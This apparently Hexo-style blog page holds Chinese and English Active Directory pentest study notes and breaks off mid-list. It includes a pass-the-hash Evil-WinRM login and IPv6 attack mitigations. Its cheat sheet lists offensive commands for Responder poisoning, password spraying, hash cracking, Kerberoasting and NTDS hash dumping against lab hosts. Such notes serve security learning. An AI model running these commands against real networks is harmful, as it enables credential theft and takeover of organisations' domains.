<p>網域控制站在5985 port執行WinRM服務，可以與雜湊值一同使用Evil-WinRM進行驗證</p>
<p>WinRM是WEB服務管理於微軟的Microsoft Windows中的實現，它允許處於一個共同網絡內的Microsoft Windows計算機彼此之間互相訪問和交換信息。在一台機器啟用WinRM後，另一台機器就能通過Windows PowerShell對開啟WinRM的機器進行遠程管理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **evil-winrm -i 192.168.19.140 -u <span class="string">&#x27;Administrator&#x27;</span> -H <span class="string">&#x27;9d45c944752dc08356c32926dbd53bb1&#x27;</span>**</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine                                                                                                                     </span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">***Evil-WinRM* PS C:\Users\Administrator\Documents&gt;**</span><br></pre></td></tr></table></figure>

<p><img src="/img/ADInitial_Untitled_30.png" alt="Untitled"></p>
<p>成功遠程登入到網域管理員帳號</p>
<h2 id="IPv6-Attack-Defenses"><a href="#IPv6-Attack-Defenses" class="headerlink" title="IPv6 Attack Defenses"></a><strong>IPv6 Attack Defenses</strong></h2><h3 id="Mitigation-Strategies"><a href="#Mitigation-Strategies" class="headerlink" title="Mitigation Strategies:"></a>Mitigation Strategies:</h3><ul>
<li>IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments.</li>
<li>If you do not use IPv6 internally,the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy.</li>
<li>Disabling IPv6 entirely may have unwanted side effects.Setting the following predefined rules to Block instead of Allow prevents the attack from working:<ul>
<li>(Inbound)Core Networking-Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)</li>
<li>(Inbound)Core Networking-Router Advertisement (ICMPv6-In)</li>
<li>(Outbound)Core Networking-Dynamic Host Configuration Protocol for IPv6(DHCPV6-Out)</li>
</ul>
</li>
<li>If WPAD is not in use internally,disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.</li>
<li>Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.</li>
<li>Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via<br>delegation.</li>
</ul>
<p><strong>a) 網路分段：</strong></p>
<p>將網路分割成更小的子網路可以透過將潛在攻擊包含在特定的網段內來限制潛在攻擊的影響。透過實施嚴格的存取控制，組織可以最大限度地減少攻擊者在其網路基礎設施內的橫向移動。</p>
<p><strong>b.入侵偵測與預防系統 (IDPS)：</strong></p>
<p>部署 IDPS 解決方案可以幫助組織偵測和防止 IPv6 攻擊。 IDPS 解決方案監控網路流量，識別可疑模式，並採取適當的措施即時緩解攻擊。</p>
<p><strong>C。定期安全審核：</strong></p>
<p>對網路基礎架構、系統和應用程式進行定期安全審核可以幫助在攻擊者利用漏洞之前識別和解決漏洞。組織還應該保持其網路設備和軟體修補並保持最新狀態。</p>
<h2 id="Passback-Attacks"><a href="#Passback-Attacks" class="headerlink" title="Passback Attacks"></a><strong>Passback Attacks</strong></h2><p>A Pen Tester’s Guide to Printer Hacking - <a target="_blank" rel="noopener" href="https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/">https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/</a></p>
<h2 id="Initial-Internal-Attack-Strategy"><a href="#Initial-Internal-Attack-Strategy" class="headerlink" title="Initial Internal Attack Strategy"></a><strong>Initial Internal Attack Strategy</strong></h2><p><img src="/img/ADInitial_Untitled_31.png" alt="Untitled"></p>
<ul>
<li>Begin day with mitm6 or Responder</li>
<li>Run scans to generate traffic</li>
<li>If scans are taking too long,look for websites in scope (http_version)</li>
<li>Look for default credentials on web logins<ul>
<li>Printers</li>
<li>Jenkins</li>
<li>Etc</li>
</ul>
</li>
<li>Think outside the box</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└── Initial Reconnaissance</span><br><span class="line">    ├── Identify Targets</span><br><span class="line">    │   ├── Systems</span><br><span class="line">    │   │   ├── Web Servers</span><br><span class="line">    │   │   ├── Database Servers</span><br><span class="line">    │   │   ├── Email Servers</span><br><span class="line">    │   │   └── Employee Workstations</span><br><span class="line">    │   └── People</span><br><span class="line">    │       ├── Key Personnel (e.g., Executives, IT Admins)</span><br><span class="line">    │       ├── Employees with Access to Sensitive Information</span><br><span class="line">    │       └── Employees Active on Social Media</span><br><span class="line">    ├── Determine Attack Methodology</span><br><span class="line">    │   ├── Identify Vulnerable Websites</span><br><span class="line">    │   │   ├── Search <span class="keyword">for</span> Websites with Outdated Software</span><br><span class="line">    │   │   ├── Scan <span class="keyword">for</span> Common Web Application Vulnerabilities (e.g., SQL Injection, XSS)</span><br><span class="line">    │   │   └── Target Specific Web Applications (e.g., CMS, CRM)</span><br><span class="line">    │   ├── Analyze Business Activities</span><br><span class="line">    │   │   ├── Monitor Publicly Available Information (e.g., Press Releases, Financial Reports)</span><br><span class="line">    │   │   └── Identify Potential Points of Exploitation (e.g., Upcoming Mergers)</span><br><span class="line">    │   ├── Understand Internal Organization</span><br><span class="line">    │   │   ├── Gather Employee Information from LinkedIn, Company Websites</span><br><span class="line">    │   │   └── Map Organizational Structure (e.g., Departments, Reporting Lines)</span><br><span class="line">    │   ├── Research Employee Conferences</span><br><span class="line">    │   │   ├── Identify Conferences Relevant to Target Industry</span><br><span class="line">    │   │   └── Gather Information on Attending Employees</span><br><span class="line">    │   └── Browse Social Media</span><br><span class="line">    │       ├── Profile Employees <span class="keyword">for</span> Social Engineering Attacks</span><br><span class="line">    │       ├── Gather Information on Employee Interests, Activities</span><br><span class="line">    │       └── Identify Potential Insider Threats</span><br><span class="line">    └── Conduct Research Activities</span><br><span class="line">        ├── Gather Information from Publicly Available Sources</span><br><span class="line">        ├── Use OSINT Tools (e.g., Shodan, Maltego) to Identify Targets</span><br><span class="line">        └── Analyze Collected Data <span class="keyword">for</span> Attack Surface Expansion</span><br><span class="line"></span><br><span class="line">└── Initial Compromise</span><br><span class="line">    └── Execute Malicious Code</span><br><span class="line">        ├── Social Engineering</span><br><span class="line">        │   ├── Craft Spear Phishing Emails Impersonating Trusted Entities</span><br><span class="line">        │   ├── Attach Malicious Documents/Links to Emails</span><br><span class="line">        │   └── Exploit Psychological Manipulation Techniques</span><br><span class="line">        ├── Exploit Vulnerability</span><br><span class="line">        │   ├── Exploit Known Vulnerabilities <span class="keyword">in</span> Internet-facing Systems (e.g., CVEs)</span><br><span class="line">        │   ├── Target Zero-Day Vulnerabilities</span><br><span class="line">        │   └── Utilize Exploit Kits (e.g., Metasploit) <span class="keyword">for</span> Automated Attacks</span><br><span class="line">        └── Other Means</span><br><span class="line">            ├── Physical Access Exploitation (e.g., USB Drop Attacks)</span><br><span class="line">            ├── Supply Chain Attacks (e.g., Compromised Software Updates)</span><br><span class="line">            └── Insider Collusion (e.g., Bribery, Coercion)</span><br><span class="line"></span><br><span class="line">└── Establish Foothold</span><br><span class="line">    └── Install Persistent Backdoor</span><br><span class="line">        ├── Plant Rootkits <span class="keyword">in</span> System Firmware</span><br><span class="line">        ├── Hide Malicious Processes via Process Injection Techniques</span><br><span class="line">        └── Create Scheduled Tasks <span class="keyword">for</span> Stealthy Execution</span><br><span class="line">    └── Download Additional Malware</span><br><span class="line">        ├── Fetch Remote Payloads from C&amp;C Servers</span><br><span class="line">        ├── Install Remote Access Trojans (RATs) <span class="keyword">for</span> Control</span><br><span class="line">        └── Deploy Keyloggers <span class="keyword">for</span> Credential Harvesting</span><br><span class="line">    └── Maintain Control</span><br><span class="line">        ├── Evade Detection with Anti-Forensic Techniques</span><br><span class="line">        ├── Implement Traffic Encryption to Avoid IDS/IPS Detection</span><br><span class="line">        └── Continuously Monitor System Activity <span class="keyword">for</span> Anomalies</span><br><span class="line"></span><br><span class="line">└── Escalate Privileges</span><br><span class="line">    └── Obtain Greater Access</span><br><span class="line">        ├── Password Hash Dumping</span><br><span class="line">        │   ├── Exploit Vulnerable Services <span class="keyword">for</span> Hash Retrieval</span><br><span class="line">        │   ├── Utilize Tools like Mimikatz <span class="keyword">for</span> Dumping LSASS Memory</span><br><span class="line">        │   └── Extract Hashes from Local SAM Database</span><br><span class="line">        ├── Keystroke/Credential Logging</span><br><span class="line">        │   ├── Deploy Keyloggers at System Level</span><br><span class="line">        │   └── Intercept User Credentials during Authentication</span><br><span class="line">        └── Exploiting Vulnerable Software</span><br><span class="line">            ├── Exploit Privilege Escalation Vulnerabilities (e.g., Windows UAC Bypass)</span><br><span class="line">            ├── Abuse Misconfigured Services <span class="keyword">for</span> Elevated Access</span><br><span class="line">            └── Hijack Privileged Processes (e.g., DLL Injection)</span><br><span class="line"></span><br><span class="line">└── Internal Reconnaissance</span><br><span class="line">    └── Explore Victim<span class="string">&#x27;s Environment</span></span><br><span class="line"><span class="string">        ├── Understand Environment</span></span><br><span class="line"><span class="string">        │   ├── Enumerate Network Topology</span></span><br><span class="line"><span class="string">        │   ├── Identify Active Directory Structure</span></span><br><span class="line"><span class="string">        │   └── Map Internal Services (e.g., File Shares, Databases)</span></span><br><span class="line"><span class="string">        ├── Identify Key Individuals</span></span><br><span class="line"><span class="string">        │   ├── Identify Domain Admins and Power Users</span></span><br><span class="line"><span class="string">        │   ├── Profile Employees with Access to Sensitive Data</span></span><br><span class="line"><span class="string">        │   └── Determine Employee Roles and Responsibilities</span></span><br><span class="line"><span class="string">        └── Determine Information Locations</span></span><br><span class="line"><span class="string">            ├── Identify High-Value Data Repositories</span></span><br><span class="line"><span class="string">            ├── Analyze File System Permissions</span></span><br><span class="line"><span class="string">            └── Enumerate Database Contents for Valuable Information</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└── Move Laterally</span></span><br><span class="line"><span class="string">    └── Access Network Shares</span></span><br><span class="line"><span class="string">        ├── Exploit Weak SMB/CIFS Permissions</span></span><br><span class="line"><span class="string">        ├── Utilize Pass-the-Hash Attacks for Authentication</span></span><br><span class="line"><span class="string">        └── Transfer Malicious Payloads via Shared Folders</span></span><br><span class="line"><span class="string">    └── Execute Programs via Task Scheduler</span></span><br><span class="line"><span class="string">        ├── Abuse Scheduled Tasks for Code Execution</span></span><br><span class="line"><span class="string">        └── Schedule Stealthy Malware Execution for Persistence</span></span><br><span class="line"><span class="string">    └── Use Remote Access Tools</span></span><br><span class="line"><span class="string">        ├── PsExec</span></span><br><span class="line"><span class="string">        │   ├── Execute Commands Remotely on Target Systems</span></span><br><span class="line"><span class="string">        │   └── Bypass UAC Restrictions for Admin Access</span></span><br><span class="line"><span class="string">        ├── RDP</span></span><br><span class="line"><span class="string">        │   ├── Remotely Control Systems with RDP Protocol</span></span><br><span class="line"><span class="string">        │   └── Exploit Weak RDP Credentials for Access</span></span><br><span class="line"><span class="string">        └── VNC</span></span><br><span class="line"><span class="string">            ├── Establish Remote Desktop Sessions for Control</span></span><br><span class="line"><span class="string">            └── Exploit VNC Authentication Weaknesses</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└── Maintain Presence</span></span><br><span class="line"><span class="string">    └── Install Malware Backdoors</span></span><br><span class="line"><span class="string">        ├── Deploy Reverse Shells for Persistent Access</span></span><br><span class="line"><span class="string">        ├── Implement RATs for Remote Control</span></span><br><span class="line"><span class="string">        └── Establish VPN Tunnels for Stealthy Communication</span></span><br><span class="line"><span class="string">    └── Gain Access to Remote Access Services</span></span><br><span class="line"><span class="string">        ├── Compromise Corporate VPNs with Stolen Credentials</span></span><br><span class="line"><span class="string">        └── Exploit Weaknesses in Remote Desktop Services for Access</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">└── Complete Mission</span></span><br><span class="line"><span class="string">    └── Accomplish Goal</span></span><br><span class="line"><span class="string">        ├── Steal Information</span></span><br><span class="line"><span class="string">        │   ├── Exfiltrate Data via Encrypted Channels</span></span><br><span class="line"><span class="string">        │   ├── Harvest Financial Documents, Intellectual Property, PII</span></span><br><span class="line"><span class="string">        │   └── Cover Tracks to Avoid Detection</span></span><br><span class="line"><span class="string">        └── Maintain Access</span></span><br><span class="line"><span class="string">            ├── Establish Secondary Backdoors for Future Access</span></span><br><span class="line"><span class="string">            └── Leave Traces for Reconnaissance on Next Target</span></span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-ActiveDirectory" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/ActiveDirectory/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.069Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/ActiveDirectory/">
        Active Directory Technology
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h1><p>在內網滲透中，當攻擊者取得內網某台機器的控制權後，會以被攻陷的主機為跳板，透過收集域內憑證等各種方法，存取域內其他機器，進一步擴大資產範圍。透過此類手段，攻擊者最終可能獲得網域控制器的存取權限，甚至完全控制基於Windows作業系統的整個內部網路環境，控制網域環境下的全部機器。</p>
<p>目錄服務 (例如 Active Directory Domain Services (AD DS)) 提供儲存目錄資料的方法，並使這些資料可供網路使用者與系統管理員使用。 例如，AD DS 會儲存使用者帳戶的相關資訊，例如名稱、密碼、電話號碼等，並讓相同網路上的其他授權使用者存取這項資訊。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/nirajkharel/AD-Pentesting-Notes">https://github.com/nirajkharel/AD-Pentesting-Notes</a></p>
<ul>
<li><p>Directory service developed by Microsoft to manage Windows domain networks</p>
</li>
<li><p>Stores information related to objects,such as Computers,Users,Printers,etc.</p>
<ul>
<li>Think about it as a phone book for Windows</li>
</ul>
</li>
<li><p>Authenticates using Kerberos tickets.</p>
<ul>
<li>Non-Windows devices,such as Linux machines,firewalls,etc.can also authenticate to Active Directory via RADIUS or LDAP</li>
</ul>
</li>
<li><p>All the directory is a identity management service</p>
</li>
<li><p>only for windows machines</p>
</li>
<li><p>Active Directory is the most commonly used identity management service in the world</p>
<ul>
<li>95%of Fortune 1000 companies implement the service in their networks (<a target="_blank" rel="noopener" href="https://techcommunity.microsoft.com/t5/Enterprise-">https://techcommunity.microsoft.com/t5/Enterprise-</a>Mobility-Security&#x2F;Success-with-Enterprise-Mobility-ldentity&#x2F;ba-p&#x2F;248613)</li>
</ul>
</li>
<li><p>Can be exploited without ever attacking patchable exploits.  Instead,we abuse features,trusts,components,and more.</p>
</li>
</ul>
<h2 id="Active-Directory-Components"><a href="#Active-Directory-Components" class="headerlink" title="Active Directory Components"></a>Active Directory Components</h2><ul>
<li><p>physical components</p>
<ul>
<li>Data store</li>
<li>Domain controllers<ul>
<li>A domain controller is a server with the AD DS server role installed that has specifically been promoted to a domain controller<ul>
<li>Host a copy of the AD DS directory store</li>
<li>Provide authentication and authorization services</li>
<li>Replicate updates to other domain controllers in the domain and forest</li>
<li>Allow administrative access to manage user accounts and network resources</li>
<li>control everything</li>
</ul>
</li>
</ul>
</li>
<li>Global catalog server</li>
<li>Read-Only Domain Controller (RODC)</li>
<li>AD DS Data Store<ul>
<li>The AD DS data store contains the <strong>database files</strong> and processes that store and <strong>manage directory information</strong> for users, services, and applications</li>
<li>Consists of the Ntds.dit file<ul>
<li>在入侵網域控制站後，我們想要取得這個 ntds.dit 檔。它包含儲存在活動目錄中的所有內容。所有<strong>哈希值都儲存在該檔案中</strong>。</li>
</ul>
</li>
<li>Allowed to pull stored password hashes</li>
<li>Is stored by default in the <strong>%SystemRoot%\NTDS</strong> folder on all domain controllers</li>
<li>Is accessible only through the domain controller processes and protocols</li>
<li>可以在目錄中建立哪些對象，例如機器使用者和電腦。可以附加到物件的資訊。顯示名稱等。定義可以儲存在目錄中的每種項目類型。</li>
</ul>
</li>
</ul>
</li>
<li><p>logical components</p>
<ul>
<li><p>Partitions</p>
</li>
<li><p>Schema</p>
</li>
<li><p>Domains</p>
</li>
<li><p>域用於對組織中的物件進行分組和管理。物件可以是印表機、群組等。</p>
<ul>
<li>Domains are <strong>used to group and manage objects</strong> in an organization<ul>
<li>user、computer、printer…</li>
</ul>
</li>
<li>An administrative boundary for applying policies to groups of objects</li>
<li>A replication boundary for replicating data between domain controllers</li>
<li>An authentication and authorization boundary that provides a way to limit the scope of access to resources</li>
<li>XX.com, XXX.tw, <a target="_blank" rel="noopener" href="http://xxx.org/">XXX.org</a> …</li>
</ul>
</li>
<li><p>Domain trees</p>
<ul>
<li>A domain tree is a hierarchy of domains in AD DS<ul>
<li>parent domain - children domain -  children domain</li>
<li><a target="_blank" rel="noopener" href="http://contonso.com/">contonso.com</a> - <a target="_blank" rel="noopener" href="http://emea.contoso.com/">emea.contoso.com</a> - na.contoso.com</li>
<li>Share a contiquous namespace with the parent domain</li>
<li>Can have additional child domains</li>
<li>By default create a two-way transitive trust with other domains</li>
</ul>
</li>
</ul>
</li>
<li><p>Forests</p>
<ul>
<li>A forest is a collection of</li>
<li>bunch of trees &gt; forest</li>
<li>one or more domain trees</li>
<li>Share a common schema</li>
<li>Share a common configuration partition</li>
<li>Share a common global catalog to enable searching</li>
<li>Enable trusts between all domains in the forest</li>
<li>Share the Enterprise Admins and Schema Admins groups</li>
<li>compromise a domain admin in a forest</li>
<li>elevate to an enterprise admin - be able to cross forest with that account</li>
</ul>
</li>
<li><p>Sites</p>
</li>
<li><p>Organization units (OUs)</p>
<ul>
<li>OUs are <strong>Active Directory containers</strong> that can contain users,groups,computers,and<br>  other OUs</li>
<li>Represent your organization hierarchically and logically</li>
<li>Manage a collection of objects in a consistent way</li>
<li>Delegate permissions to administer groups of objects</li>
<li>Apply policies</li>
</ul>
</li>
<li><p>Trusts</p>
<ul>
<li><p>Trusts provide a mechanism for users to gain access to resources in another domain</p>
<p>  <img src="/img/AD_Untitled.png" alt="Untitled"></p>
</li>
<li><p>All domains in a forest trust all other domains in the forest</p>
</li>
<li><p>Trusts can extend outside the forest</p>
</li>
</ul>
</li>
<li><p>Defines every type of object that can be stored in the directory</p>
</li>
<li><p>Enforces rules regarding object creation and configuration</p>
</li>
<li><p>Like rule book 、 buleprint</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>Object Types</th>
<th>Function</th>
<th>Examples</th>
</tr>
</thead>
<tbody><tr>
<td>Class Object</td>
<td>What objects can be created in the directory</td>
<td></td>
</tr>
</tbody></table>
<ul>
<li>user、computer、printer… | + User</li>
<li>Computer |<br>  | Attribute Object | Information that can be attached to an object | + Display name |</li>
</ul>
</li>
<li><p>Objects</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>Object</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>User</td>
<td>Enables network resource access for a user</td>
</tr>
<tr>
<td>InetOrgPerson</td>
<td>Similar to a user account</td>
</tr>
<tr>
<td>Contacts</td>
<td>Used primarily to assign e-mail addresses to external users</td>
</tr>
<tr>
<td>Groups</td>
<td>Used to simplify the administration of access control</td>
</tr>
<tr>
<td>Computers</td>
<td>Enables authentication and auditing of computer access to resources</td>
</tr>
<tr>
<td>Printers</td>
<td>Used to simplify the process of locating and connecting to printers</td>
</tr>
<tr>
<td>Shared folders</td>
<td>Enables users to search for shared folders based on properties</td>
</tr>
</tbody></table>
<p><img src="/img/AD_Untitled_1.png" alt="Untitled"></p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>sudo responder -I ens224 -A</td>
<td>Start Responder in analysis mode</td>
</tr>
<tr>
<td>sudo responder -I ens224 -w -d</td>
<td>Start network traffic response spoofing with Responder to gather NTLMv2 password hashes</td>
</tr>
<tr>
<td>kerbrute userenum -d INLANEFREIGHT.LOCAL –dc 172.16.5.5 jsmith.txt -o kerb-results</td>
<td>Enumerate valid Active Directory users for password spraying</td>
</tr>
<tr>
<td>hashcat -m 5600 bsmith_ntlmv2 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</td>
<td>Attempt to crack an NTLMv2 password hash gathered with Responder using Hashcat</td>
</tr>
<tr>
<td>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 –pass-pol</td>
<td>Enumerate the domain password policy using CrackMapExec</td>
</tr>
<tr>
<td>crackmapexec smb 10.129.203.121 -u ‘’ -p ‘’ –users –export $(pwd)&#x2F;users.txt</td>
<td>Check for SMB NULL sessions on a domain controller host and enumerate valid users</td>
</tr>
<tr>
<td>enum4linux -P 172.16.5.5</td>
<td>Leverage an SMB NULL session on a domain controller host to verify the domain password policy</td>
</tr>
<tr>
<td>kerbrute passwordspray -d inlanefreight.local –dc 172.16.5.5 valid_users.txt Welcome1</td>
<td>Perform a password spraying attack using the Kerbrute tool</td>
</tr>
<tr>
<td>Import-Module ActiveDirectory</td>
<td>Load the built-in Active Directory PowerShell module on a Windows host</td>
</tr>
<tr>
<td>Get-ADUser -Filter *</td>
<td>select Name</td>
</tr>
<tr>
<td>Get-DomainUser *</td>
<td>Select-Object samaccountname,description</td>
</tr>
<tr>
<td>GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL&#x2F;mholliday</td>
<td>Kerberoast from a Linux attack host</td>
</tr>
<tr>
<td>bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u bsmith -p Welcome1</td>
<td>Run the BloodHound Python version from a Linux attack host to map out the domain</td>
</tr>
<tr>
<td>SharpHound.exe -c all –zipfilename inlanefreight_bloodhound</td>
<td>Run the SharpHound C# ingestor from a Windows attack host to map out the domain</td>
</tr>
<tr>
<td>Invoke-BloodHound -CollectionMethod all -ZipFileName ilfreight_bloodhound</td>
<td>Run the SharpHound PowerShell ingestor from a Windows attack host to map out the domain</td>
</tr>
<tr>
<td>Rubeus.exe kerberoast &#x2F;ldapfilter:’admincount&#x3D;1’ &#x2F;nowrap</td>
<td>Kerberoast admin accounts using the Rubeus tool from a Windows attack host</td>
</tr>
<tr>
<td>secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT&#x2F;<a href="mailto:&#97;&#100;&#x75;&#110;&#x6e;&#x40;&#49;&#55;&#50;&#46;&#x31;&#x36;&#x2e;&#x35;&#x2e;&#53;">&#97;&#100;&#x75;&#110;&#x6e;&#x40;&#49;&#55;&#50;&#46;&#x31;&#x36;&#x2e;&#x35;&#x2e;&#53;</a> -use-vss</td>
<td>Dump the NTDS Active Directory database to retrieve NTLM password hashes for all domain users for offline cracking</td>
</tr>
</tbody></table>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#enumerating-active-directory-with-credentials-session">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology#enumerating-active-directory-with-credentials-session</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide">https://www.hackthebox.com/blog/active-directory-penetration-testing-cheatsheet-and-guide</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a></p>
<p><a target="_blank" rel="noopener" href="https://medium.com/@awabrajpoot88/active-directory-inital-attack-vectors-2-8479bed79411">https:&#x2F;&#x2F;medium.com&#x2F;@awabrajpoot88&#x2F;active-directory-inital-attack-vectors-2-8479bed79411</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Active Directory Methodology" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Active%20Directory%20Methodology/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.068Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Active%20Directory%20Methodology/">
        Active Directory Methodology
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Active-Directory-Methodology"><a href="#Active-Directory-Methodology" class="headerlink" title="Active Directory Methodology"></a>Active Directory Methodology</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└── Active Directory (AD)</span><br><span class="line">    ├── Overview</span><br><span class="line">    │   ├── Foundational Technology</span><br><span class="line">    │   │   ├── Efficient Creation and Management of Domains, Users, and Objects</span><br><span class="line">    │   │   ├── Scalability</span><br><span class="line">    │   │   └── Access Control</span><br><span class="line">    │   ├── Structure</span><br><span class="line">    │   │   ├── Domains</span><br><span class="line">    │   │   │   ├── Collection of Objects (Users, Devices) with a Common Database</span><br><span class="line">    │   │   │   └── Multiple Domains Can Coexist Within a Forest</span><br><span class="line">    │   │   ├── Trees</span><br><span class="line">    │   │   │   ├── Groups of Domains Linked by a Shared Structure</span><br><span class="line">    │   │   │   └── Common Root Domain</span><br><span class="line">    │   │   └── Forests</span><br><span class="line">    │   │       ├── Collection of Multiple Trees</span><br><span class="line">    │   │       └── Interconnected Through Trust Relationships</span><br><span class="line">    │   ├── Key Concepts</span><br><span class="line">    │   │   ├── Directory</span><br><span class="line">    │   │   │   └── Houses Information Pertaining to AD Objects</span><br><span class="line">    │   │   ├── Object</span><br><span class="line">    │   │   │   └── Entities Within the Directory (Users, Groups, Shared Folders)</span><br><span class="line">    │   │   ├── Domain</span><br><span class="line">    │   │   │   └── Container <span class="keyword">for</span> Directory Objects</span><br><span class="line">    │   │   ├── Tree</span><br><span class="line">    │   │   │   └── Grouping of Domains Sharing a Common Root</span><br><span class="line">    │   │   └── Forest</span><br><span class="line">    │   │       └── Collection of Trees with Trust Relationships</span><br><span class="line">    └── Active Directory Domain Services (AD DS)</span><br><span class="line">        ├── Services</span><br><span class="line">        │   ├── Domain Services</span><br><span class="line">        │   │   └── Centralizes Data Storage and Manages Interactions Between Users and Domains</span><br><span class="line">        │   ├── Certificate Services</span><br><span class="line">        │   │   └── Creation, Distribution, and Management of Secure Digital Certificates</span><br><span class="line">        │   ├── Lightweight Directory Services</span><br><span class="line">        │   │   └── Supports Directory-enabled Applications Through LDAP</span><br><span class="line">        │   ├── Directory Federation Services</span><br><span class="line">        │   │   └── Provides Single-Sign-On Across Multiple Web Applications</span><br><span class="line">        │   ├── Rights Management</span><br><span class="line">        │   │   └── Safeguards Copyright Material</span><br><span class="line">        │   └── DNS Service</span><br><span class="line">        │       └── Crucial <span class="keyword">for</span> Domain Name Resolution</span><br><span class="line">        └── Kerberos Authentication</span><br><span class="line">            └── Understanding the Kerberos Authentication Process</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└── Recon Active Directory (No creds/sessions)</span><br><span class="line">    ├── Pentest the Network</span><br><span class="line">    │   ├── Scan <span class="keyword">for</span> Machines and Open Ports</span><br><span class="line">    │   │   ├── nmap -p- -sV -T4 &lt;network&gt;</span><br><span class="line">    │   │   └── nmap -p 1-65535 -T4 -A -v &lt;target&gt;</span><br><span class="line">    │   ├── Exploit Vulnerabilities</span><br><span class="line">    │   │   ├── Searchsploit &lt;service/version&gt;</span><br><span class="line">    │   │   ├── Metasploit Framework</span><br><span class="line">    │   │   └── Manual Exploitation</span><br><span class="line">    │   └── Enumerate DNS</span><br><span class="line">    │       └── gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt</span><br><span class="line">    ├── Enumerate SMB</span><br><span class="line">    │   ├── Null and Guest Access</span><br><span class="line">    │   │   ├── enum4linux -a -u <span class="string">&quot;&quot;</span> -p <span class="string">&quot;&quot;</span> &lt;DC IP&gt;</span><br><span class="line">    │   │   └── smbmap -u <span class="string">&quot;&quot;</span> -p <span class="string">&quot;&quot;</span> -P 445 -H &lt;DC IP&gt;</span><br><span class="line">    │   └── Detailed SMB Enumeration</span><br><span class="line">    │       ├── smbclient -U <span class="string">&#x27;%&#x27;</span> -L //&lt;DC IP&gt;</span><br><span class="line">    │       ├── smbclient -U <span class="string">&#x27;guest%&#x27;</span> -L //&lt;DC IP&gt;</span><br><span class="line">    │       └── smbclient -U <span class="string">&#x27;guest%&#x27;</span> //&lt;DC IP&gt;/sharename</span><br><span class="line">    ├── Enumerate LDAP</span><br><span class="line">    │   └── nmap -n -sV --script <span class="string">&quot;ldap* and not brute&quot;</span> -p 389 &lt;DC IP&gt;</span><br><span class="line">    ├── Poison the Network</span><br><span class="line">    │   ├── Gather Credentials with Responder</span><br><span class="line">    │   │   ├── Responder -I &lt;interface&gt;</span><br><span class="line">    │   │   └── Responder -I &lt;interface&gt; -wrf</span><br><span class="line">    │   ├── Relay Attack</span><br><span class="line">    │   │   └── Responder -I &lt;interface&gt; -wb</span><br><span class="line">    │   └── Expose Fake UPnP Services with evil-SSDP</span><br><span class="line">    │       └── python evil-SSDP.py -i &lt;interface&gt; -p &lt;port&gt;</span><br><span class="line">    ├── OSINT</span><br><span class="line">    │   └── Extract Usernames/Names from Internal Documents and Social Media</span><br><span class="line">    │       ├── 